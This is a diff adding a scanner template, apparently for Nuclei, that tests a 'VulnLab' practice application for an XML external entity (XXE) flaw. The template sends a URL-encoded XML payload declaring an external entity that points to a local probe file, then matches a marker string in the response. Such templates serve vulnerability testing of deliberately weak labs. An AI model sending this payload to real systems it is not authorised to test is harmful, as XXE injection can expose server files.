@@ -1,0 +1,24 @@
+id: vulnlab-xxe-low
+
+info:
+  name: VulnLab XXE low 档
+  author: hediwen
+  severity: high
+  tags: vulnlab,xxe
+
+http:
+  - raw:
+      - |
+        POST /xxe/low.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        xml=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20order%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22xxe_probe.txt%22%3E%5D%3E%3Corder%3E%3Cid%3E%26xxe%3B%3C%2Fid%3E%3C%2Forder%3E
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "订单号：<b>VULNLAB_XXE_PROBE_MARKER"
